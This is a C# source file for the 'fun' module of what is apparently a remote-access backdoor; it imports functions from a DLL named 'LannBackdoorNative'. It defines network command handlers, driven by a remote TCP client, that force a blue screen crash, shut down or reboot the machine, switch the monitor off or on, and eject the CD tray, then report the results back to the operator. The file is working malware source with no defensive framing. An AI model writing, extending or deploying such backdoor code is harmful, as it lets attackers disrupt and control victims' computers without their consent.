using System.Runtime.InteropServices;
using FSModule.Structures;
using FunModule.Structures.Handlers;
using LannLogger;
using ModulesApi;
using Networking;
using Networking.Packets;
using Networking.Structures;
using Serilog.Core;
using SystemModule.Structures;

namespace FunModule;

[Module("fun")]
public class FunModuleImpl {
    private static readonly Logger Logger = LoggerFactory.CreateLogger("Module", "FileSystem");

    [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    private static extern void RaiseBSOD();

    [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    private static extern void ShutdownPC(bool restart);

    [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    private static extern void ToggleMonitor(bool turnOn);

    [DllImport("LannBackdoorNative.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    private static extern void OpenCDRom();
    
    [Handler("bsod")]
    public static async Task BsodHandler(TCPClient client, EmptyHandlerData data) {
        RaiseBSOD();
    }
    
    [Handler("cdrom")]
    public static async Task CDRomHandler(TCPClient client, EmptyHandlerData data) {
        CDRomResult result = new();
        try {
            OpenCDRom();
            result.Success = true;
        } catch (Exception error) {
            result.Error = error.Message;
            result.Success = false;
        }
        
        await client.SendPacket(new ClientPacket {
            Type = PacketType.Callback,
            Data = result
        });
    }
    
    [Handler("shutdown")]
    public static async Task ShutdownHandler(TCPClient client, EmptyHandlerData data) {
        ShutdownPC(false);
    }
    
    [Handler("reboot")]
    public static async Task RebootHandler(TCPClient client, EmptyHandlerData data) {
        ShutdownPC(true);
    }
    
    [Handler("toggleMonitor")]
    public static async Task ToggleMonitorHandler(TCPClient client, ToggleMonitorHandlerData data) {
        ToggleMonitorResult result = new();
        try {
            ToggleMonitor(data.Enable);
            result.Success = true;
        } catch (Exception error) {
            result.Error = error.Message;
            result.Success = false;
        }
        
        await client.SendPacket(new ClientPacket {
            Type = PacketType.Callback,
            Data = result
        });
    }
}